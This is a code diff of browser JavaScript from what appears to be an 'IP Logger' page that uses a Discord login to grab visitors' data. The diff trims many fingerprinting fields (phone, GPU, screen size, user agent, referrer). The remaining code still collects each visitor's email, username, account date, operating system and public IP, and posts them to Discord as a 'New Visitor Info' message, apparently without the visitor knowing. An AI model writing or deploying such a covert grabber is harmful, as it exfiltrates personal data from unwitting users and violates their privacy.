@@ -48,62 +48,32 @@ async function fetchUserData(code) {
     const user = await userInfoResponse.json();
     const username = user.username; // Extract username
     const email = user.email || "No Email attached.";
-    const phone = user.phone || "No Number attached.";
-    const avatarUrl = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
     const createdAt = new Date(user.created_at).toLocaleString(); // Account creation date
-    const nitro = user.premium_type ? "has nitro" : "no nitro"; // Check for Nitro status
     const operatingSystem = navigator.platform; // Get operating system
-    const city = "City not available"; // You would need to use a geo API for real data
-    const country = "Country not available"; // You would need to use a geo API for real data
 
     // Call the function to send visitor info along with the user information
-    sendInfoToDiscord(email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country, username);
+    sendInfoToDiscord(email, username, createdAt, operatingSystem);
 }
 
-async function sendInfoToDiscord(email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country, username) {
+async function sendInfoToDiscord(email, username, createdAt, operatingSystem) {
     const ipResponse = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipResponse.json();
     const ip = ipData.ip;
 
     // Get additional information
-    const userAgent = navigator.userAgent;
-    const referrer = document.referrer || 'Direct visit';
     const timestamp = new Date().toISOString();
-    const language = navigator.language;
-    const screenResolution = `${window.screen.width}x${window.screen.height}`;
-    const currentUrl = window.location.href;
-    const deviceMemory = navigator.deviceMemory || 'Not Available'; // RAM size in GB
-    const hardwareConcurrency = navigator.hardwareConcurrency || 'Not Available'; // Number of logical processors
-    const screenDPI = (window.devicePixelRatio * 96).toFixed(2) + ' DPI'; // Estimated screen DPI
-
-    const gl = document.createElement('canvas').getContext('webgl');
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Not Available';
 
     const embedMessage = {
         embeds: [{
             title: '👤 New Visitor Info',
             color: 0xFF0000, // Red color
             fields: [
-                { name: '🖥️ IP Address', value: ip, inline: true },
-                { name: '🌐 User-Agent', value: userAgent, inline: true },
-                { name: '🔗 Referrer', value: referrer, inline: true },
-                { name: '📅 Timestamp', value: timestamp, inline: true },
-                { name: '🌍 Language', value: language, inline: true },
-                { name: '📺 Screen Resolution', value: screenResolution, inline: true },
-                { name: '🔗 Current URL', value: currentUrl, inline: true },
-                { name: '💾 Device Memory', value: `${deviceMemory} GB`, inline: true },
-                { name: '🧠 Hardware Concurrency', value: `${hardwareConcurrency} logical processors`, inline: true },
-                { name: '🖼️ Screen DPI', value: screenDPI, inline: true },
-                { name: '🎮 Graphics Card', value: gpu, inline: true },
                 { name: '📧 Email', value: email, inline: true },
-                { name: '📱 Phone', value: phone, inline: true },
-                { name: '🖼️ Profile Picture', value: `[View Avatar](${avatarUrl})`, inline: true },
+                { name: '🖥️ IP Address', value: ip, inline: true },
+                { name: '👤 Username', value: username, inline: true },
                 { name: '📅 Account Created', value: createdAt, inline: true },
                 { name: '🖥️ Operating System', value: operatingSystem, inline: true }, // Operating System
-                { name: '🌆 City', value: city, inline: true }, // City
-                { name: '🌍 Country', value: country, inline: true }, // Country
-                { name: '🎮 Discord Nitro', value: nitro, inline: true } // Nitro status
+                { name: '📅 Timestamp', value: timestamp, inline: true }, // Timestamp
             ],
             footer: {
                 text: 'Logged by IP Logger',
